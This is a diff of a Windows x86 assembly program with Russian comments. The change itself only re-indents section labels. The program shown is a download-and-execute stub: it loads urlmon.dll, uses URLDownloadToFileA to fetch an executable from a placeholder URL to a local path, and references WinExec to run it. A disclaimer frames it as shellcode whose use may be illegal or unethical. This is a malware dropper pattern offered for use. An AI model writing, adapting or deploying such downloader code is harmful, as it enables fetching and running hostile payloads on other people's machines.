@@ -7,10 +7,10 @@
 В данной программу нет реального выполнения шеллкода. Выполнение шеллкода остается на усмотрение того, кто использует программу.
 Обращаю внимание, что использование программы может быть запрещено местным законодательством вашей страны, а так же нарушать этические нормы и правила общества.
 
-section .text
+    section .text
     global _start
-
-_start:
+    
+    _start:
     ; Инициализация библиотеки URLMON.dll
     push offset urlmon_dll
     call LoadLibraryA
@@ -38,14 +38,14 @@ _start:
     push 0
     call ExitProcess
 
-section .data
+    section .data
     urlmon_dll db 'urlmon.dll', 0
     kernel32_dll db 'kernel32.dll', 0
     url db 'http://example.com/file.exe', 0
     file_path db 'C:\path\to\save\file.exe', 0
     win_exec db 'WinExec', 0
-
-section .idata
+    
+    section .idata
     dd 0,0,0,0,0
     URLDownloadToFileA dd 0, 0, 0, 0
     LoadLibraryA dd 0, 0, 0, 0
